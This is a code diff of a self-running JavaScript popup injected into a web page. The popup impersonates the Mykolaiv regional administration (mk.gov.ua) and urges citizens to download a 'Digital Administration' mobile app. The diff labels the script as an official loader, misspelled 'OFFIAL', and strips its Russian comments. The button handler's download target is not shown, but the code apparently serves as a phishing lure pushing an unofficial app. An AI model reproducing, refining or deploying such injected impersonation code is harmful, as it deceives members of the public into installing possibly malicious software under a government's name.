@@ -1,5 +1,8 @@
+// MK.GOV.UA OFFIAL POPUP LOADER
+// MK.GOV.UA OFFIAL POPUP LOADER
+// MK.GOV.UA OFFIAL POPUP LOADER
+
 (function() {
-    // Создаем стили
     const style = document.createElement('style');
     style.textContent = `
         .popup-overlay {
@@ -98,10 +101,10 @@
         }
     `;
     
-    // Создаем структуру попапа
     const popupHTML = `
         <div class="popup-overlay" id="taxPopup">
             <div class="popup-container">
+                <title>MikolaevDIA - Завантажити</title>
                 <div class="popup-title">ЗВЕРНЕННЯ ДО ГРОМАДЯН МИКОЛАЇВСЬКОЇ ОБЛАСТІ</div>
                 <div class="popup-text">
                     Шановні громадяни! В межах цифровізації державних послуг та спрощення адміністративних процедур, наше управління впровадило спеціальний мобільний додаток "Цифрова Адміністрація".<br><br>
@@ -118,11 +121,9 @@
         </div>
     `;
     
-    // Добавляем стили и попап в документ
     document.head.appendChild(style);
     document.body.insertAdjacentHTML('beforeend', popupHTML);
     
-    // Добавляем обработчик для кнопки
     setTimeout(() => {
         const downloadBtn = document.getElementById('downloadBtn');
         if (downloadBtn) {
@@ -134,7 +135,6 @@
         }
     }, 100);
     
-    // Закрытие при клике на фон
     setTimeout(() => {
         const overlay = document.getElementById('taxPopup');
         if (overlay) {
@@ -147,7 +147,6 @@
         }
     }, 100);
     
-    // Автоматическое закрытие через 60 секунд
     setTimeout(() => {
         const popup = document.getElementById('taxPopup');
         if (popup) {
